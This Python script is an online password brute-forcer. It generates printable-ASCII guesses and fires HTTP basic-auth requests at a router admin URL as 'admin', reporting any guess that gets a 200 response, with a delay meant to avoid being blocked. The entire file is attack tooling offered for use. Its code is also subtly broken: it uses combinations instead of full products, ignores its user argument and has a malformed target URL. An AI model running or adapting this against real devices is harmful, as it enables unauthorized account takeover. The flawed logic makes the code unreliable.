import requests
from time import sleep
from itertools import combinations
from typing import Generator


def pwd_gen(pwd_len: int = 2, text_output: bool = True) -> Generator | list:
    """Simple brute force pwd generator.

    Generates ascending list of ASCII extended set passwords start from size ''->len(N).

    Start generating passwords from nothing Eg '' to going through 95 chars of the
    Extended ASCII char set. starting at 1 char and building upto the pwd_len.
    Starting at 1 default is 2.

    Args:
        pwd_len (int): -> Defaults to 2.
            The maximum size of the password you want to brute force
        text_output (bool): -> Defaults to true.
            Sets weather you want tuples to be returned or string
    Returns:
        each_combo (Generator | Str): This returns the current iteration of pwd.
    """
    yield '' ##Check if pwd is nothing
    chars = [chr(c) for c in range(32,127)] ##Extended ASCII set
    for i in range(pwd_len):
        for each_combo in combinations(chars, i+1):
            if text_output:
                yield ''.join(each_combo)
            else:
                yield each_combo

def atk(url: str = "", user: str = "admin", limit: float | int = 0.2) -> None:
    """Guesses passwords for a given URL

    Args:
        url (str, required): -> Defaults to "".
            The URL you want to guess the pwd.            
        user (str, optional): -> Defaults to "admin"
            Ther user you are trying to guess the pwd.
        limit (float | int, optional): -> Defaults to 0.2 seconds
            Rate in seconds. To low and you might get blocked.
    
    Returns:
        None -> prints any 200 reponse and the given pwd to terminal
    """
    for pwd_guess in pwd_gen(pwd_len=2):
       res = requests.get(url, auth=("admin", pwd_guess))
       sleep(limit)
       if res.status_code == 200:
           print("Got 200 reponse on pwd: {}".format(pwd_guess))

atk(url="http://http://192.168.1.1/admin/", user="admin", limit=0.1)